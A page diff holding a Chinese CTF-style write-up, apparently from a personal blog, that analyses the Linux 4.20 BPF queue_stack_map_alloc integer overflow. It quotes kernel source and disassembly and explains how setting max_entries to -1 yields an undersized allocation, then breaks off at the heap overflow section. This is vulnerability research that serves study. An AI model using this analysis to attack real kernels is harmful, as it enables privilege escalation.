@@ -145,198 +145,258 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">Linux kernel 4.20 BPF 整数溢出漏洞</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/ai.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2022-10-02 14:51:24
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/kernel-pwn/">kernel-pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/bpf/">bpf</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%A0%86%E5%96%B7%E5%B0%84/">堆喷射</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.5k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>13 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <p>题目会放在:<a class="link"   target="_blank" rel="noopener" href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>kernel中的bpf模块主要用于用户态定义数据包过滤方法，如常见的抓包工具都基于此实现，并且用户态的Seccomp功能也与此功能相似。</p>
+<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>该漏洞存在于BPF_MAP_CREATE功能中，并且可以看到处理的函数是map_create。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(bpf, <span class="keyword">int</span>, cmd, <span class="keyword">union</span> bpf_attr __user *, uattr, <span class="keyword">unsigned</span> <span class="keyword">int</span>, size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sysctl_unprivileged_bpf_disabled &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">    <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">  err = bpf_check_uarg_tail_zero(uattr, <span class="keyword">sizeof</span>(attr), size);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  size = <span class="keyword">min_t</span>(u32, size, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(&amp;attr, uattr, size) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">  err = security_bpf(cmd, &amp;attr, size);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> BPF_MAP_CREATE:</span><br><span class="line">      err = map_create(&amp;attr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> BPF_MAP_LOOKUP_ELEM:</span><br><span class="line">      err = map_lookup_elem(&amp;attr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> BPF_MAP_UPDATE_ELEM:</span><br><span class="line">      err = map_update_elem(&amp;attr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 
+<p>可以看到下面使用find_and_alloc_map函数创建一个map结构体，并为其分配编号，然后寻找出来生成的map。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_create</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="keyword">int</span> f_flags;</span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  err = CHECK_ATTR(BPF_MAP_CREATE);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  f_flags = bpf_get_file_flag(attr-&gt;map_flags);</span><br><span class="line">  <span class="keyword">if</span> (f_flags &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> f_flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (numa_node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)numa_node &gt;= nr_node_ids ||</span><br><span class="line">       !node_online(numa_node)))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span></span><br><span class="line">  <span class="built_in">map</span> = find_and_alloc_map(attr);</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">    <span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">  err = bpf_obj_name_cpy(<span class="built_in">map</span>-&gt;name, attr-&gt;map_name);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line"></span><br><span class="line">  atomic_set(&amp;<span class="built_in">map</span>-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">  atomic_set(&amp;<span class="built_in">map</span>-&gt;usercnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (attr-&gt;btf_key_type_id || attr-&gt;btf_value_type_id) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!attr-&gt;btf_key_type_id || !attr-&gt;btf_value_type_id) &#123;</span><br><span class="line">      err = -EINVAL;</span><br><span class="line">      <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    btf = btf_get_by_fd(attr-&gt;btf_fd);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(btf)) &#123;</span><br><span class="line">      err = PTR_ERR(btf);</span><br><span class="line">      <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = map_check_btf(<span class="built_in">map</span>, btf, attr-&gt;btf_key_type_id,</span><br><span class="line">                        attr-&gt;btf_value_type_id);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      btf_put(btf);</span><br><span class="line">      <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span>-&gt;btf = btf;</span><br><span class="line">    <span class="built_in">map</span>-&gt;btf_key_type_id = attr-&gt;btf_key_type_id;</span><br><span class="line">    <span class="built_in">map</span>-&gt;btf_value_type_id = attr-&gt;btf_value_type_id;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  err = security_bpf_map_alloc(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line"></span><br><span class="line">  err = bpf_map_init_memlock(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map_sec;</span><br><span class="line"></span><br><span class="line">  err = bpf_map_alloc_id(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map;</span><br><span class="line"></span><br><span class="line">  err = bpf_map_new_fd(<span class="built_in">map</span>, f_flags);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* failed to allocate fd.</span></span><br><span class="line"><span class="comment">		 * bpf_map_put() is needed because the above</span></span><br><span class="line"><span class="comment">		 * bpf_map_alloc_id() has published the map</span></span><br><span class="line"><span class="comment">		 * to the userspace and the userspace may</span></span><br><span class="line"><span class="comment">		 * have refcnt-ed it through BPF_MAP_GET_FD_BY_ID.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">    bpf_map_put(<span class="built_in">map</span>);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  free_map:</span><br><span class="line">  bpf_map_release_memlock(<span class="built_in">map</span>);</span><br><span class="line">  free_map_sec:</span><br><span class="line">  security_bpf_map_free(<span class="built_in">map</span>);</span><br><span class="line">  free_map_nouncharge:</span><br><span class="line">  btf_put(<span class="built_in">map</span>-&gt;btf);</span><br><span class="line">  <span class="built_in">map</span>-&gt;ops-&gt;map_free(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
+<p>下面分析find_and_alloc_map函数，那么首先还是先看一下传参结构体的定义：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* anonymous struct used by BPF_MAP_CREATE command */</span></span><br><span class="line">		__u32	map_type;	<span class="comment">/* one of enum bpf_map_type */</span></span><br><span class="line">		__u32	key_size;	<span class="comment">/* size of key in bytes */</span></span><br><span class="line">		__u32	value_size;	<span class="comment">/* size of value in bytes */</span></span><br><span class="line">		__u32	max_entries;	<span class="comment">/* max number of entries in a map */</span></span><br><span class="line">		__u32	map_flags;	<span class="comment">/* BPF_MAP_CREATE related</span></span><br><span class="line"><span class="comment">					 * flags defined above.</span></span><br><span class="line"><span class="comment">					 */</span></span><br><span class="line">		__u32	inner_map_fd;	<span class="comment">/* fd pointing to the inner map */</span></span><br><span class="line">		__u32	numa_node;	<span class="comment">/* numa node (effective only if</span></span><br><span class="line"><span class="comment">					 * BPF_F_NUMA_NODE is set).</span></span><br><span class="line"><span class="comment">					 */</span></span><br><span class="line">		<span class="keyword">char</span>	map_name[BPF_OBJ_NAME_LEN];</span><br><span class="line">		__u32	map_ifindex;	<span class="comment">/* ifindex of netdev to create on */</span></span><br><span class="line">		__u32	btf_fd;		<span class="comment">/* fd pointing to a BTF type data */</span></span><br><span class="line">		__u32	btf_key_type_id;	<span class="comment">/* BTF type_id of the key */</span></span><br><span class="line">		__u32	btf_value_type_id;	<span class="comment">/* BTF type_id of the value */</span></span><br><span class="line">	&#125;;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">find_and_alloc_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">	u32 type = attr-&gt;map_type;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">	type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));</span><br><span class="line">	ops = bpf_map_types[type];</span><br><span class="line">	<span class="keyword">if</span> (!ops)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ops-&gt;map_alloc_check) &#123;</span><br><span class="line">		err = ops-&gt;map_alloc_check(attr);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (attr-&gt;map_ifindex)</span><br><span class="line">		ops = &amp;bpf_map_offload_ops;</span><br><span class="line">	<span class="built_in">map</span> = ops-&gt;map_alloc(attr);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">	<span class="built_in">map</span>-&gt;ops = ops;</span><br><span class="line">	<span class="built_in">map</span>-&gt;map_type = type;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
+<p>可以看到这里是首先根据type作为索引得到ops，最后再调用ops中的map_alloc函数但是可以注意到的是在数组中存在以下的ops结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">queue_map_ops</span> =</span> &#123;</span><br><span class="line">	.map_alloc_check = queue_stack_map_alloc_check,</span><br><span class="line">	.map_alloc = queue_stack_map_alloc,</span><br><span class="line">	.map_free = queue_stack_map_free,</span><br><span class="line">	.map_lookup_elem = queue_stack_map_lookup_elem,</span><br><span class="line">	.map_update_elem = queue_stack_map_update_elem,</span><br><span class="line">	.map_delete_elem = queue_stack_map_delete_elem,</span><br><span class="line">	.map_push_elem = queue_stack_map_push_elem,</span><br><span class="line">	.map_pop_elem = queue_map_pop_elem,</span><br><span class="line">	.map_peek_elem = queue_map_peek_elem,</span><br><span class="line">	.map_get_next_key = queue_stack_map_get_next_key,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-    }
+<p>这里的漏洞也就存在于上述结构体中的<code>queue_stack_map_alloc</code>函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF8119D17A 44 89 F0                      mov     eax, r14d</span><br><span class="line">.text:FFFFFFFF8119D17D 4C 8B 3C C5 80 83 02 82       mov     r15, ds:qword_FFFFFFFF82028380[rax*8]</span><br><span class="line">  </span><br><span class="line">.rodata:FFFFFFFF82028380 qword_FFFFFFFF82028380   dq 0                    ; DATA XREF: map_create+AD↑r</span><br><span class="line">; ... ...</span><br><span class="line">.rodata:FFFFFFFF82028410                 dq offset unk_FFFFFFFF8210F0A0</span><br><span class="line">.rodata:FFFFFFFF82028418                 dq offset unk_FFFFFFFF82029B00</span><br><span class="line">.rodata:FFFFFFFF82028420                 dq offset unk_FFFFFFFF8202A680</span><br><span class="line">.rodata:FFFFFFFF82028428                 dq offset unk_FFFFFFFF82029B00</span><br><span class="line">.rodata:FFFFFFFF82028430                 dq offset unk_FFFFFFFF82029C40</span><br><span class="line">.rodata:FFFFFFFF82028438                 dq offset off_FFFFFFFF82029BA0</span><br><span class="line">; ... ...</span><br><span class="line">.rodata:FFFFFFFF82029BA0                 dq offset queue_stack_map_alloc_check</span><br><span class="line">.rodata:FFFFFFFF82029BA8                 dq offset queue_stack_map_alloc</span><br><span class="line">.rodata:FFFFFFFF82029BB0                 dq 0</span><br><span class="line">.rodata:FFFFFFFF82029BB8                 dq offset queue_stack_map_free</span><br><span class="line">.rodata:FFFFFFFF82029BC0                 dq offset queue_stack_map_get_next_key</span><br><span class="line">.rodata:FFFFFFFF82029BC8                 dq 0</span><br><span class="line">.rodata:FFFFFFFF82029BD0                 dq offset queue_stack_map_lookup_elem</span><br><span class="line">.rodata:FFFFFFFF82029BD8                 dq offset queue_stack_map_update_elem</span><br><span class="line">.rodata:FFFFFFFF82029BE0                 dq offset queue_stack_map_delete_elem</span><br><span class="line">.rodata:FFFFFFFF82029BE8                 dq offset queue_stack_map_push_elem</span><br><span class="line">.rodata:FFFFFFFF82029BF0                 dq offset stack_map_pop_elem</span><br><span class="line">.rodata:FFFFFFFF82029BF8                 dq offset stack_map_peek_elem</span><br></pre></td></tr></table></figure>
 
+<p>可以看到只要计算偏移就可以成功修改ops为<code>queue_stack_map_alloc</code>函数，经过计算可得type为:<code>(0xFFFFFFFF82028438 - 0xFFFFFFFF82028380）/8 = 0x17 </code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">queue_stack_map_alloc</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret, numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line">	u64 size, queue_size, cost;</span><br><span class="line"></span><br><span class="line">	size = (u64) attr-&gt;max_entries + <span class="number">1</span>;</span><br><span class="line">	cost = queue_size = <span class="keyword">sizeof</span>(*qs) + size * attr-&gt;value_size;</span><br><span class="line">	<span class="keyword">if</span> (cost &gt;= U32_MAX - PAGE_SIZE)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-E2BIG);</span><br><span class="line"></span><br><span class="line">	cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	ret = bpf_map_precharge_memlock(cost);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">	qs = bpf_map_area_alloc(queue_size, numa_node);</span><br><span class="line">	<span class="keyword">if</span> (!qs)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(qs, <span class="number">0</span>, <span class="keyword">sizeof</span>(*qs));</span><br><span class="line"></span><br><span class="line">	bpf_map_init_from_attr(&amp;qs-&gt;<span class="built_in">map</span>, attr);</span><br><span class="line"></span><br><span class="line">	qs-&gt;<span class="built_in">map</span>.pages = cost;</span><br><span class="line">	qs-&gt;size = size;</span><br><span class="line"></span><br><span class="line">	raw_spin_lock_init(&amp;qs-&gt;lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> &amp;qs-&gt;<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
+<p>可以看到这里的cost其实就是等于<code>sizeof(*qs) + (attr-&gt;value_size) * (attr-&gt;max_entries+1)</code>，并且这里的attr是我们可控的，如果我们控制<code>attr-&gt;max_entries</code>为-1那么这里申请的大小只有<code>sizeof(struct bpf_queue_stack)</code>并且这个size其实是管理堆块的大小，用于存储数据结构，后面的内容为数据存储结构。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bpf_map_init_from_attr</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">map</span>-&gt;map_type = attr-&gt;map_type;</span><br><span class="line">	<span class="built_in">map</span>-&gt;key_size = attr-&gt;key_size;</span><br><span class="line">	<span class="built_in">map</span>-&gt;value_size = attr-&gt;value_size;</span><br><span class="line">	<span class="built_in">map</span>-&gt;max_entries = attr-&gt;max_entries;</span><br><span class="line">	<span class="built_in">map</span>-&gt;map_flags = attr-&gt;map_flags;</span><br><span class="line">	<span class="built_in">map</span>-&gt;numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
+<p>最后将用户传进来的attr赋值过去。最后生成id，并将id返回给用户。</p>
+<h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p>可以看到在上面的系统调用中存在BPF_MAP_UPDATE_ELEM功能，其实现的函数为：map_update_elem</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 